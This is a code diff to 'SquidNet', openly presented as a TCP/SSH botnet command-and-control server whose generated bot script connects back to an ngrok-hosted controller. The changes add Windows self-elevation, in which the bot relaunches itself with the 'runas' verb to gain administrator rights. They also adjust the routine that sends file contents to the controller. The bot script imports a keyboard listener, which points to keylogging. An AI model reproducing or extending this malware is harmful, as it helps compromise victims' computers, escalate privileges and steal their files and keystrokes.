@@ -428,8 +428,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] IPADDR  : {ipaddr}
 [+] USERNAME: {user}
 [+] CONN    : {connection}
-[+] OS      : {opsys}
-                                                            """)
+[+] OS      : {opsys}""")
                         info = str(hostname + " " + ipaddr + " " + user + " " + connection + " " + opsys)
                         self.info.append(info)
                         print(f"\n[!] {hostname} has connected to the botnet.")
@@ -1236,7 +1235,7 @@ admin = BotMaster('""" + self.ngroklink + """',""" + str(
         the in-built commands or run any other instructions with command prompt/terminal."""
         script = """
 #-----SquidNet-Bot-Script-----#
-import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json, subprocess, re, shutil
+import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json, subprocess, re, shutil, ctypes
 from datetime import datetime, timedelta
 try:
     from pynput.keyboard import Listener # pip install pynput
@@ -4756,6 +4755,7 @@ OS:       {sys.platform}
             content = file.read()
             file.close()
             self.send(content)
+            time.sleep(5)
             self.send("finished".encode())
         except:
             pass
@@ -5190,7 +5190,22 @@ OS:       {sys.platform}
 ip = '""" + self.ngroklink + """'
 port = """ + str(self.ngrokport) + """
 key = """ + str(self.key) + """
-bot = Bot(ip, port, key)
+if sys.platform == "win32":
+    try:
+        isadmin = ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        isadmin = False
+    if isadmin:
+        bot = Bot(ip, port, key)
+    else:
+        exec_dir = sys.argv[0]
+        params = f'"{exec_dir}"'
+        try:
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+        except:
+            bot = Bot(ip, port, key)
+else:
+    bot = Bot(ip, port, key)
 #-----End-Of-Bot-----#
         """
         return script
